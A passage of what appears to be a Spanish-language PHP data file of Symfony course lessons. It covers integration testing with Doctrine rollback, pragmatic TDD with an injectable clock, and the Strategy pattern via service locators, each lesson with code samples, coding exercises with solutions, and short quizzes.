                    'filename' => 'tests/Integration/OrderPaymentProcessorTest.php',
                    'title' => 'Prueba de Integración con KernelTestCase, Doctrine Rollback y Dobles de Prueba',
                    'tag' => 'Symfony KernelTestCase & Rollback',
                    'code' => "declare(strict_types=1);

namespace App\Tests\Integration;

use App\Entity\Order;
use App\Enum\OrderStatus;
use App\Payment\PaymentGatewayInterface;
use App\Payment\PaymentResult;
use App\Service\OrderPaymentProcessor;
use Doctrine\ORM\EntityManagerInterface;
use Symfony\Bundle\FrameworkBundle\Test\KernelTestCase;

class OrderPaymentProcessorTest extends KernelTestCase
{
    private EntityManagerInterface \$em;
    private OrderPaymentProcessor \$processor;
    private PaymentGatewayInterface \$paymentGatewayMock;

    protected function setUp(): void
    {
        self::bootKernel();
        \$container = static::getContainer();

        \$this->em = \$container->get(EntityManagerInterface::class);

        // Doble de prueba: Solo se mockea la pasarela de pago externa (I/O externo)
        \$this->paymentGatewayMock = \$this->createMock(PaymentGatewayInterface::class);

        // Se inyecta el servicio real con el mock de infraestructura externa
        \$this->processor = new OrderPaymentProcessor(
            \$this->em,
            \$this->paymentGatewayMock
        );
    }

    public function testSuccessfulPaymentTransitionsOrderStatusAndPersists(): void
    {
        // 1. Arrange: Crear entidad real en base de datos de test
        \$order = new Order(reference: 'ORD-98231', amountInCents: 15000);
        \$order->setStatus(OrderStatus::Pending);

        \$this->em->persist(\$order);
        \$this->em->flush();

        // Expectativa en el gateway externo
        \$this->paymentGatewayMock
            ->expects(\$this->once())
            ->method('charge')
            ->with(15000, 'ORD-98231')
            ->willReturn(new PaymentResult(success: true, transactionId: 'tx_stripe_test_123'));

        // 2. Act: Ejecutar el caso de uso real
        \$result = \$this->processor->processPayment(\$order->getId());

        // 3. Assert: Verificar estado del retorno y persistencia real en base de datos
        \$this->assertTrue(\$result);

        // Limpiar Identity Map para forzar lectura real desde la base de datos
        \$this->em->clear();
        \$reloadedOrder = \$this->em->getRepository(Order::class)->find(\$order->getId());

        \$this->assertNotNull(\$reloadedOrder);
        \$this->assertSame(OrderStatus::Paid, \$reloadedOrder->getStatus());
        \$this->assertSame('tx_stripe_test_123', \$reloadedOrder->getTransactionId());
    }

    protected function tearDown(): void
    {
        parent::tearDown();
        // Evitar memory leaks liberando referencias al contenedor
        unset(\$this->em, \$this->processor, \$this->paymentGatewayMock);
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior no mide la calidad de una suite por el número absoluto de tests o un falso 100% de code coverage cosmético. Diseña la suite con pragmatismo: pruebas unitarias ultrarrápidas y puras para lógica algorítmica y Value Objects; pruebas de integración reales con rollback de base de datos para repositorios; y pruebas funcionales para validar el contrato HTTP y la seguridad.',
                    'critical_questions' => [
                        '¿Este test está validando comportamiento de negocio observable o acoplándose a detalles de implementación que romperán futuros refactors?',
                        '¿Por qué estamos mockeando EntityManagerInterface en vez de probar la persistencia real en un test de integración con rollback?',
                        '¿Qué dobles de prueba estamos usando: Stubs de estado, Mocks de interacción o Fakes en memoria para servicios de terceros?',
                        '¿La suite de pruebas en CI es determinista o contiene flaky tests por acoplamiento a servicios externos o al reloj del sistema?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Probar la lógica de negocio y persistencia de un cambio de estado en un pedido con integración de pasarela de pago.',
                    'junior' => [
                        'approach' => 'Mockea obsesivamente cada llamada interna de Doctrine (createQueryBuilder, where, setParameter, getQuery, getSingleResult) y todas las entidades intermedias en un test unitario frágil.',
                        'flaws' => [
                            'Mockea detalles internos de implementación de Doctrine en vez de validar comportamiento de negocio.',
                            'Fragilidad extrema: un refactor óptimo del repositorio rompe el test a pesar de que el negocio sigue funcionando.',
                            'No valida que la consulta SQL o DQL realmente compile o sea compatible con el motor de base de datos.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Aplica el diamante de pruebas: prueba unitaria pura para reglas matemáticas y de estado, y prueba de integración con KernelTestCase y transacciones rollback para persistencia real, aislando únicamente la pasarela de pago externa.',
                        'rationale' => [
                            'Aporta 100% de certeza real de que las entidades, restricciones foráneas y queries funcionan en producción.',
                            'Permite refactorizar libremente el interior del repositorio sin romper la suite.',
                            'Aislamiento total de I/O externo costoso (Stripe) mediante interfaces bien definidas.',
                        ],
                        'trade_offs' => 'Requiere configurar una base de datos de test en CI y gestionar migraciones de prueba.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Motor de Descuentos con Invariantes Estrictas y Casos Límite',
                    'objective' => 'Implementar la lógica pura y testeable de DiscountCalculator asegurando tipado estricto, protección contra números negativos, control de porcentajes mayores a 100, soporte de cupón VIP y redondeo bancario exacto.',
                    'instructions' => 'Completa la clase DiscountCalculator: valida que subtotal no sea negativo y que discountPercent esté entre 0.0 y 100.0 (lanzando InvalidArgumentException). Si el cupón es \'VIP2026\' y el subtotal supera 100.0, añade 15.0 al descuento calculado. Asegura que el descuento nunca supere el subtotal y redondea a 2 decimales usando round(\$val, 2, PHP_ROUND_HALF_UP).',
                    'filename' => 'DiscountCalculator.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Pricing;\n\nuse InvalidArgumentException;\n\nclass DiscountCalculator\n{\n    public function calculateDiscount(float \$subtotal, float \$discountPercent, ?string \$couponCode = null): float\n    {\n        // TODO: Valida invariantes estrictas: subtotal >= 0.0 y discountPercent entre 0.0 y 100.0\n        // TODO: Calcula descuento porcentual base\n        // TODO: Si \$couponCode === 'VIP2026' y \$subtotal > 100.0, añade 15.0 de bonificación\n        // TODO: Asegura que el descuento jamás exceda \$subtotal\n        // TODO: Redondea el resultado a 2 decimales con PHP_ROUND_HALF_UP\n        return 0.0;\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Pricing;\n\nuse InvalidArgumentException;\n\nclass DiscountCalculator\n{\n    public function calculateDiscount(float \$subtotal, float \$discountPercent, ?string \$couponCode = null): float\n    {\n        if (\$subtotal < 0.0) {\n            throw new InvalidArgumentException('El subtotal no puede ser negativo.');\n        }\n\n        if (\$discountPercent < 0.0 || \$discountPercent > 100.0) {\n            throw new InvalidArgumentException('El porcentaje de descuento debe estar entre 0 y 100.');\n        }\n\n        \$discount = (\$subtotal * \$discountPercent) / 100.0;\n\n        if (\$couponCode === 'VIP2026' && \$subtotal > 100.0) {\n            \$discount += 15.0;\n        }\n\n        if (\$discount > \$subtotal) {\n            \$discount = \$subtotal;\n        }\n\n        return round(\$discount, 2, PHP_ROUND_HALF_UP);\n    }\n}\n",
                    'explanation' => 'Un diseño testeable por naturaleza desacopla la lógica algorítmica de los efectos secundarios (I/O, bases de datos o reloj del sistema). Al blindar las invariantes con excepciones tempranas y límites superiores/inferiores deterministas, la clase puede someterse a pruebas unitarias exhaustivas con Data Providers en fracciones de milisegundo.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Estrategias de Testing & Test Doubles',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Por qué mockear `EntityManagerInterface` y `QueryBuilder` en pruebas unitarias se considera un anti-patrón de diseño en la industria?',
                            'options' => [
                                'a' => 'Porque acopla el test a los detalles internos de implementación y orden de llamadas de Doctrine en vez de validar el comportamiento de negocio, creando tests frágiles que se rompen al refactorizar.',
                                'b' => 'Porque Doctrine prohíbe el uso de PHPUnit en entornos de producción.',
                                'c' => 'Porque los mocks de Doctrine consumen más de 1GB de RAM por prueba.',
                                'd' => 'Porque las interfaces de Doctrine no pueden ser mockeadas en PHP 8.4.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Mockear un ORM viola la máxima de "no mockees lo que no te pertenece". El test pasa a verificar que llamaste a getQuery() o where(), pero no prueba si la consulta SQL es correcta o si las entidades están mapeadas adecuadamente.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => 'En la terminología canónica de Test Doubles (Gerard Meszaros / Martin Fowler), ¿cuál es la diferencia fundamental entre un Stub y un Mock?',
                            'options' => [
                                'a' => 'Un Stub solo funciona con bases de datos MySQL y un Mock con Redis.',
                                'b' => 'Un Stub proporciona datos de respuesta prefijados a llamadas entrantes (State Verification), mientras que un Mock además registra y verifica activamente las expectativas de llamadas realizadas, métodos y parámetros (Behavior Verification).',
                                'c' => 'Un Stub no compila en PHP 8.4, mientras que un Mock sí.',
                                'd' => 'Un Stub se ejecuta dentro del contenedor de Symfony y un Mock fuera de él.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Los Stubs proporcionan entradas indirectas prefijadas a la clase bajo prueba. Los Mocks evalúan la interacción y el protocolo de llamadas salientes hacia colaboradores externos.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Qué mecanismo técnico utiliza `DAMADoctrineTestBundle` para que las pruebas de integración en Symfony con base de datos real se ejecuten a máxima velocidad?',
                            'options' => [
                                'a' => 'Borra y recrea las tablas de la base de datos antes de cada método de test.',
                                'b' => 'Inicia una transacción de base de datos antes de cada test y ejecuta un rollback automático al finalizar, evitando costosas operaciones de I/O en disco como DROP TABLE o TRUNCATE.',
                                'c' => 'Convierte todas las consultas SQL en archivos de texto plano temporales en /tmp.',
                                'd' => 'Desactiva las restricciones de claves foráneas permanentemente en el motor de base de datos.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'DAMA envuelve cada prueba en una transacción y ejecuta ROLLBACK al concluir el test. La base de datos conserva su estado original sin el tremendo impacto de I/O que supondría reconstruir el schema en cada ejecución.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // LECCIÓN: TDD Pragmático en Symfony
            // ==========================================
            'testing-tdd-pragmatic' => [
                'slug' => 'testing-tdd-pragmatic',
                'title' => 'TDD Pragmático en Symfony',
                'module' => 'Testing & TDD',
                'minutes' => 50,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'Test-Driven Development (TDD) no es una técnica de testing, sino una disciplina de diseño de software guiada por el ciclo Red-Green-Refactor. En el mundo real de Symfony, el TDD pragmático rechaza el dogmatismo: se aplica con rigor en el núcleo de dominio (cálculos financieros, máquinas de estados, invariantes críticas) mientras que en tareas periféricas o CRUDs directos se utiliza un enfoque guiado por pruebas de integración. Se profundiza en el contraste entre la Escuela de Chicago (Inside-Out, guiada por estado y objetos reales) y la Escuela de Londres (Outside-In, guiada por mocks y diseño de interfaces colaborativas), y se adopta Mutation Testing (Infection PHP) como el verdadero estándar de oro de calidad.',
                    'problem' => 'Equipos que intentan aplicar TDD dogmático en cada línea de código de un proyecto Symfony terminan exhaustos escribiendo tests vacíos para controladores simples y entidades anémicas. O por el contrario, equipos que escriben código primero y luego redactan tests apresurados para inflar el Code Coverage al 100%, dejando mutantes vivos y bugs sutiles en producción.',
                    'solution' => 'Escribir el test primero cuando exista incertidumbre algorítmica o complejidad de reglas de negocio para diseñar firmas de métodos limpias y ergonómicas. Utilizar Mutation Testing (Infection PHP) para erradicar tests zombis y medir el Mutation Score Indicator (MSI). Inyectar abstracciones temporales (ClockInterface de Symfony) para independizar el dominio del tiempo del sistema operativo.',
                    'problem_label' => 'El Espejismo del 100% Code Coverage y la Burocracia Dogmática:',
                    'solution_label' => 'La Solución: Diseño Red-Green-Refactor, Clock Inyectable y Mutation Testing:',
                ],
                'internals' => [
                    'title' => 'Anatomía del Ciclo Red-Green-Refactor y Mutation Score Indicator',
                    'steps' => [
                        [
                            'phase' => '1. Fase Red (Diseño como Consumidor)',
                            'description' => 'Escribir la prueba primero obliga a pensar como usuario de la API pública. Se definen nombres de métodos concisos, tipos estrictos e invariantes antes de cualquier decisión de almacenamiento o persistencia.',
                        ],
                        [
                            'phase' => '2. Fase Green (Implementación Mínima)',
                            'description' => 'Escribir el código estrictamente necesario para que la prueba pase. Evita la sobre-ingeniería prematura y generalizaciones injustificadas.',
                        ],
                        [
                            'phase' => '3. Fase Refactor (Diseño Limpio con Red de Seguridad)',
                            'description' => 'Con los tests en verde, reorganizar el código, extraer clases, simplificar expresiones y eliminar duplicación con total certidumbre de no introducir regresiones.',
                        ],
                        [
                            'phase' => '4. Mutation Testing & Infection PHP',
                            'description' => 'Infection muta deliberadamente el código fuente (cambia > por >=, niega condiciones, altera números). Si los tests no fallan, el mutante sobrevive (Escaped Mutant), indicando que el test no evalúa esa aserción crítica.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'tests/Unit/SubscriptionBillingEngineTest.php',
                    'title' => 'Diseño TDD de un Motor de Facturación con ClockInterface Inyectable',
                    'tag' => 'TDD & Symfony ClockInterface',
                    'code' => "declare(strict_types=1);

namespace App\Tests\Unit;

use App\Billing\SubscriptionBillingEngine;
use App\Billing\SubscriptionPlan;
use App\Enum\SubscriptionStatus;
use DateTimeImmutable;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use Symfony\Component\Clock\MockClock;

class SubscriptionBillingEngineTest extends TestCase
{
    private MockClock \$clock;
    private SubscriptionBillingEngine \$engine;

    protected function setUp(): void
    {
        // MockClock permite fijar y manipular el tiempo de forma determinista
        \$this->clock = new MockClock('2026-03-01 10:00:00');
        \$this->engine = new SubscriptionBillingEngine(\$this->clock);
    }

    public function testActiveSubscriptionRenewsGracePeriodWhenPaymentFails(): void
    {
        // 1. Arrange: Plan activo que vence hoy
        \$plan = new SubscriptionPlan(
            id: 'plan_pro',
            priceInCents: 2900,
            gracePeriodDays: 3
        );

        \$expiresAt = new DateTimeImmutable('2026-03-01 23:59:59');

        // 2. Act: Procesar fallo de pago hoy
        \$transition = \$this->engine->handlePaymentFailure(\$plan, \$expiresAt);

        // 3. Assert: Debe entrar en período de gracia hasta el 4 de marzo
        \$this->assertSame(SubscriptionStatus::InGracePeriod, \$transition->newStatus);
        \$this->assertSame('2026-03-04 23:59:59', \$transition->gracePeriodUntil->format('Y-m-d H:i:s'));
    }

    public function testSubscriptionIsSuspendedWhenGracePeriodExpires(): void
    {
        \$plan = new SubscriptionPlan(id: 'plan_pro', priceInCents: 2900, gracePeriodDays: 3);

        // Avanzamos el reloj de Symfony 5 días en el futuro
        \$this->clock->modify('+5 days');

        \$graceExpiresAt = new DateTimeImmutable('2026-03-04 23:59:59');

        \$transition = \$this->engine->evaluateGraceExpiry(\$plan, \$graceExpiresAt);

        \$this->assertSame(SubscriptionStatus::Suspended, \$transition->newStatus);
        \$this->assertTrue(\$transition->requiresIntervention);
    }

    #[DataProvider('invalidPlanProvider')]
    public function testThrowsDomainExceptionOnInvalidConfiguration(int \$graceDays, int \$price): void
    {
        \$this->expectException(\\InvalidArgumentException::class);

        new SubscriptionPlan('invalid_plan', \$price, \$graceDays);
    }

    public static function invalidPlanProvider(): array
    {
        return [
            'negative grace period' => [-1, 2900],
            'negative price' => [3, -500],
        ];
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Para un Senior, TDD no es una ceremonia dogmática para alcanzar un número artificial de cobertura, sino un instrumento heurístico de diseño de APIs. Escribir el test primero desde el rol del consumidor obliga a concebir interfaces ergonómicas, desacopladas e inmutables, derivando cada excepción y método de una necesidad real. Además, utiliza Mutation Testing (Infection PHP) para erradicar tests zombis y asegurar que los assertions realmente validan la lógica de negocio.',
                    'critical_questions' => [
                        '¿Estamos aplicando TDD para guiar el diseño de un dominio complejo o escribiendo pruebas burocráticas sobre controladores triviales?',
                        '¿Cuándo conviene abordar el diseño de adentro hacia afuera (Inside-Out / Chicago) vs de afuera hacia adentro (Outside-In / London)?',
                        '¿Cómo verificamos la solidez de la suite mediante Mutation Testing (MSI) en lugar de depender únicamente del Code Coverage?',
                        '¿Estamos usando ClockInterface de Symfony para que el tiempo sea una dependencia determinista libre de flaky tests?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Diseñar y probar la tarificación escalonada y prorrateada de suscripciones mensuales dependientes del tiempo.',
                    'junior' => [
                        'approach' => 'Escribe la lógica completa de forma empírica mezclando fechas del sistema (time(), new DateTime()) y luego escribe un test cosmético con assertNotNull para inflar el coverage al 100%.',
                        'flaws' => [
                            'Test redactado después del código que solo busca pintar de verde el reporte de cobertura.',
                            'Aserciones irrelevantes (assertNotNull) que permiten que un bug evidente en el cálculo pase inadvertido.',
                            'Acoplamiento al reloj del sistema operativo, generando tests intermitentes (flaky tests).',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Aplica el ciclo Red-Green-Refactor de TDD: define el contrato con ClockInterface y DataProvider, blinda las invariantes con excepciones tempranas y valida la suite con Mutation Testing.',
                        'rationale' => [
                            'Diseño ergonómico guiado desde la perspectiva del consumidor de la clase.',
                            'Tiempo completamente determinista y manipulable mediante MockClock en milisegundos.',
                            'Mutation Score Indicator (MSI) > 85%, garantizando que ningún mutante de cálculo sobreviva.',
                        ],
                        'trade_offs' => 'Requiere mayor disciplina inicial de diseño antes de escribir la implementación.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Implementación Guiada por Pruebas de TieredBillingCalculator',
                    'objective' => 'Implementar la clase de facturación escalonada y prorrateada TieredBillingCalculator garantizando validación estricta de invariantes de días y tarifas, cálculo de tramos por consumo y redondeo financiero exacto.',
                    'instructions' => 'Completa la clase TieredBillingCalculator: valida invariantes lanzando InvalidArgumentException si monthlyRate < 0.0, totalDaysInMonth < 28 o > 31, activeDays < 1 o > totalDaysInMonth, o consumedUnits < 0. Calcula la base prorrateada: (monthlyRate / totalDaysInMonth) * activeDays. Aplica tarificación escalonada sobre consumedUnits: las primeras 100 unidades son gratis (0.0); unidades de 101 a 500 pagan 0.10 por unidad extra sobre 100; unidades superiores a 500 pagan 40.0 + 0.25 por unidad extra sobre 500. Retorna la suma total redondeada a 2 decimales con round(\$total, 2, PHP_ROUND_HALF_UP).',
                    'filename' => 'TieredBillingCalculator.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Billing;\n\nuse InvalidArgumentException;\n\nclass TieredBillingCalculator\n{\n    public function calculateProratedAmount(\n        float \$monthlyRate,\n        int \$activeDays,\n        int \$totalDaysInMonth,\n        int \$consumedUnits\n    ): float {\n        // TODO: Validar invariantes estrictas de días y tarifas (lanzando InvalidArgumentException)\n        // TODO: Calcular base prorrateada por días activos\n        // TODO: Calcular cargo escalonado por unidades consumidas (tiers)\n        // TODO: Retornar suma redondeada a 2 decimales con PHP_ROUND_HALF_UP\n        return 0.0;\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Billing;\n\nuse InvalidArgumentException;\n\nclass TieredBillingCalculator\n{\n    public function calculateProratedAmount(\n        float \$monthlyRate,\n        int \$activeDays,\n        int \$totalDaysInMonth,\n        int \$consumedUnits\n    ): float {\n        if (\$monthlyRate < 0.0) {\n            throw new InvalidArgumentException('La tarifa mensual no puede ser negativa.');\n        }\n\n        if (\$totalDaysInMonth < 28 || \$totalDaysInMonth > 31) {\n            throw new InvalidArgumentException('El total de días en el mes debe estar entre 28 y 31.');\n        }\n\n        if (\$activeDays < 1 || \$activeDays > \$totalDaysInMonth) {\n            throw new InvalidArgumentException('Los días activos deben estar entre 1 y el total de días del mes.');\n        }\n\n        if (\$consumedUnits < 0) {\n            throw new InvalidArgumentException('Las unidades consumidas no pueden ser negativas.');\n        }\n\n        \$proratedBase = (\$monthlyRate / \$totalDaysInMonth) * \$activeDays;\n\n        \$unitsCost = 0.0;\n        if (\$consumedUnits > 500) {\n            \$unitsCost = 40.0 + ((\$consumedUnits - 500) * 0.25);\n        } elseif (\$consumedUnits > 100) {\n            \$unitsCost = (\$consumedUnits - 100) * 0.10;\n        }\n\n        return round(\$proratedBase + \$unitsCost, 2, PHP_ROUND_HALF_UP);\n    }\n}\n",
                    'explanation' => 'En el desarrollo guiado por pruebas (TDD), cada condición e invariante de dominio se deriva de un test que falló previamente en rojo (Red). La separación estricta de la base temporal prorrateada y el tramo escalonado permite que la función sea completamente determinista, pura y libre de efectos colaterales.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: TDD, Mutation Testing & Arquitectura Testeable',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Qué problema crítico del software detecta el "Mutation Testing" (mediante herramientas como Infection PHP) que la métrica de Code Coverage oculta por completo?',
                            'options' => [
                                'a' => 'Detecta si el servidor web tiene configurado FastCGI.',
                                'b' => 'Detecta tests superficiales o "zombis" que ejecutan líneas de código pero carecen de aserciones suficientes para detectar mutaciones intencionales de operadores o lógica de negocio.',
                                'c' => 'Detecta errores de compilación en plantillas Twig.',
                                'd' => 'Mide la latencia de red entre microservicios.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Code Coverage solo indica qué líneas se ejecutaron. Mutation Testing altera deliberadamente el código de producción (mutantes); si los tests no fallan al mutar el código, significa que la suite no valida verdaderamente esa lógica.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Cuál es el principal valor arquitectónico de escribir pruebas unitarias antes de la implementación (TDD Red-Green-Refactor)?',
                            'options' => [
                                'a' => 'Asegura que no se necesiten revisiones de código en GitHub.',
                                'b' => 'Fuerza a diseñar los contratos y la API pública desde la perspectiva de quien los consume, produciendo componentes desacoplados, firmas de métodos ergonómicas y alta cohesión por diseño.',
                                'c' => 'Elimina la necesidad de utilizar tipado estricto en PHP 8.4.',
                                'd' => 'Duplica la velocidad de procesamiento de MySQL.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'El verdadero beneficio de TDD radica en el diseño de software. Pensar en cómo se consumirá una clase antes de implementarla evita la introducción de dependencias innecesarias y favorece interfaces limpias.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Por qué en un sistema con lógica dependiente del tiempo (ej. renovaciones, cálculo de prorrateos, gracia) un Senior inyecta `Symfony\\Component\\Clock\\ClockInterface` en lugar de usar `time()` o `new DateTimeImmutable()`?',
                            'options' => [
                                'a' => 'Porque time() no está disponible en PHP 8.4.',
                                'b' => 'Porque ClockInterface desacopla el dominio del reloj del sistema operativo, permitiendo congelar o avanzar el tiempo de forma determinista en pruebas unitarias mediante MockClock y erradicar tests intermitentes (flaky tests).',
                                'c' => 'Para que MySQL guarde las fechas en formato Unix Timestamp de forma obligatoria.',
                                'd' => 'Porque ClockInterface reduce el uso de memoria RAM a cero.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Acoplarse al reloj del sistema es una causa principal de tests intermitentes. Con ClockInterface (PSR-20), el tiempo es una dependencia inyectable que se controla con precisión milimétrica en tests con MockClock.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 9: LECCIÓN 1: Factory & Strategy con Inyección de Symfony
            // ==========================================
            'patterns-factory-strategy' => [
                'slug' => 'patterns-factory-strategy',
                'title' => 'Factory & Strategy con Inyección de Symfony',
                'module' => 'Patrones de Diseño',
                'minutes' => 45,
                'difficulty' => 'Avanzado',
                'overview' => [
                    'concept' => 'El patrón Strategy permite definir una familia de algoritmos intercambiables, encapsular cada uno en una clase independiente y hacerlos intercambiables en tiempo de ejecución. En el ecosistema moderno de Symfony 8.1 y PHP 8.4, el patrón alcanza su máxima expresión al combinarse con el contenedor de inyección de dependencias mediante Tagged Iterators (#[TaggedIterator]) y Service Locators tipados (#[AutowireLocator]). Esto erradica por completo los condicionales monolíticos (switch-case) y respeta al 100% el principio Open/Closed (OCP): añadir un nuevo canal o método de pago consiste únicamente en crear una clase con el atributo adecuado, sin tocar una sola línea de código preexistente.',
                    'problem' => 'El antipatrón del "Switch-Case Monolítico" dentro de un servicio central. Cada vez que el negocio requiere un nuevo método de pago (Stripe, PayPal, Bizum, Apple Pay), se modifica la misma clase de checkout. Esto dispara la complejidad ciclomática, incrementa exponencialmente el riesgo de regresiones y fuerza a inyectar en el constructor las dependencias de todas las pasarelas imaginables, instanciando servicios pesados que jamás se utilizarán en la petición activa.',
                    'solution' => 'Inyectar un ServiceLocator tipado o Tagged Iterator que resuelva estrategias bajo demanda con tiempo de acceso O(1). Las estrategias implementan una interfaz común (PaymentStrategyInterface) y exponen un identificador o Backed Enum. El resolver consulta al contenedor únicamente cuando la estrategia es demandada (Lazy Loading), aislando dependencias y garantizando extensibilidad ilimitada.',
                    'problem_label' => 'El Antipatrón del Switch-Case Monolítico y Dependencias Infladas:',
                    'solution_label' => 'La Solución: Tagged Services, AutowireLocator y Selección O(1) de Estrategias:',
                ],
                'internals' => [
                    'title' => 'Mecánica Interna de Tagged Services y Service Locators',
                    'steps' => [
                        [
                            'phase' => '1. Tagging Declarativo con #[AutoconfigureTag]',
                            'description' => 'Symfony permite etiquetar automáticamente en tiempo de compilación todas las clases que implementen una interfaz mediante el atributo #[AutoconfigureTag("app.payment_strategy")], prescindiendo de configuración manual en YAML.',
                        ],
                        [
                            'phase' => '2. Lazy ServiceLocator vs TaggedIterator',
                            'description' => 'Mientras #[TaggedIterator] instancia todas las estrategias al iterar, #[AutowireLocator] genera un subcontenedor privado que solo instancia la estrategia requerida cuando se invoca $locator->get($id), optimizando memoria y conexiones TCP.',
                        ],
                        [
                            'phase' => '3. Backed Enums como Claves Tipadas en PHP 8.4',
                            'description' => 'El uso de Enums respaldados (PaymentMethod::CreditCard, PaymentMethod::PayPal) como índices del ServiceLocator garantiza seguridad de tipos estricta y previene errores tipográficos en cadenas de texto arbitrarias.',
                        ],
                        [
                            'phase' => '4. Excepciones de Dominio y Erradicación de Nulos',
                            'description' => 'Si se solicita una estrategia desconocida o inactiva, el resolver lanza de inmediato una excepción explícita (UnsupportedPaymentStrategyException) en lugar de retornar null o fallar silenciosamente.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Payment/PaymentStrategyResolver.php',
                    'title' => 'Resolver de Estrategias de Pago con AutowireLocator y Backed Enums',
                    'tag' => 'Strategy Pattern & Symfony ServiceLocator',
                    'code' => "declare(strict_types=1);

namespace App\Payment;

use App\Enum\PaymentMethod;
use App\Payment\Exception\UnsupportedPaymentMethodException;
use App\Payment\Strategy\PaymentStrategyInterface;
use Psr\Container\ContainerInterface;
use Symfony\Component\DependencyInjection\Attribute\AutowireLocator;

class PaymentStrategyResolver
{
    /**
     * @param ContainerInterface \$paymentStrategies ServiceLocator privado generado por Symfony
     */
    public function __construct(
        #[AutowireLocator('app.payment_strategy')]
        private readonly ContainerInterface \$paymentStrategies
    ) {}

    public function resolve(PaymentMethod \$method): PaymentStrategyInterface
    {
        if (!\$this->paymentStrategies->has(\$method->value)) {
            throw new UnsupportedPaymentMethodException(
                sprintf('No se encontró una estrategia de pago registrada para el método \"%s\".', \$method->value)
            );
        }

        /** @var PaymentStrategyInterface \$strategy */
        \$strategy = \$this->paymentStrategies->get(\$method->value);

        return \$strategy;
    }

    public function execute(PaymentMethod \$method, int \$amountInCents, string \$currency): PaymentResult
    {
        \$strategy = \$this->resolve(\$method);

        return \$strategy->charge(\$amountInCents, \$currency);
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior no implementa patrones de diseño como abstracciones académicas aisladas, sino como soluciones de ingeniería integradas con el framework de producción. Jamás instancia estrategias manualmente con new ni crea factories artesanales repletas de switch-case. Aprovecha el contenedor compilado de Symfony para que agregar una nueva estrategia sea 100% declarativo, desacoplado y con carga perezosa (lazy-loading).',
                    'critical_questions' => [
                        '¿Estamos violando el principio Open/Closed al modificar una clase existente cada vez que se agrega una nueva variante de negocio?',
                        '¿Qué impacto de memoria tiene usar #[TaggedIterator] si tenemos 50 estrategias pesadas con conexiones externas frente a #[AutowireLocator]?',
                        '¿Estamos utilizando Enums nativos de PHP 8.4 para tipar las claves de resolución o dependiendo de strings mágicos?',
                        '¿Cómo manejamos la degradación elegante si la pasarela seleccionada se encuentra en mantenimiento o no está disponible?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Procesar transacciones de compra con múltiples pasarelas de pago (Stripe, PayPal, Bizum) seleccionadas dinámicamente.',
                    'junior' => [
                        'approach' => 'Crea un método gigante en CheckoutService con switch ($method) e inyecta StripeClient, PayPalClient y BizumClient directamente en el constructor.',
                        'flaws' => [
                            'Violación flagrante de Open/Closed: agregar un método de pago exige editar la clase de checkout.',
                            'Constructor inflado con dependencias no utilizadas que se instancian inútilmente en cada petición.',
                            'Dificultad severa para realizar pruebas unitarias aisladas sin mockear todas las pasarelas a la vez.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Desacopla cada pasarela tras PaymentStrategyInterface con etiqueta de autoconfiguración, e inyecta un ServiceLocator en PaymentStrategyResolver.',
                        'rationale' => [
                            'Cumplimiento estricto de OCP: nuevas pasarelas se integran creando un archivo sin tocar el núcleo.',
                            'Lazy Loading real: únicamente se inicializa la pasarela que el usuario solicitó.',
                            'Pruebas unitarias triviales mockeando o testeando cada estrategia de forma estrictamente aislada.',
                        ],
                        'trade_offs' => 'Requiere comprender la arquitectura de etiquetado de servicios y ServiceLocator de Symfony.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Resolver de Estrategias de Descuento con Validación e Invariantes',
                    'objective' => 'Implementar DiscountStrategyResolver que registre dinámicamente estrategias que implementen DiscountStrategyInterface, valide que el identificador no sea vacío ni duplicado, lance InvalidArgumentException ante estrategias desconocidas o montos negativos, y ejecute el cálculo de descuento.',
                    'instructions' => 'Completa DiscountStrategyResolver: implementa registerStrategy validando que getIdentifier() no sea vacío ni esté previamente registrado (lanzando InvalidArgumentException). Implementa resolve buscando la estrategia por identificador o lanzando InvalidArgumentException si no existe. Implementa execute validando que amount y rate no sean negativos (lanzando InvalidArgumentException), resolviendo la estrategia y aplicando el descuento.',
                    'filename' => 'DiscountStrategyResolver.php',
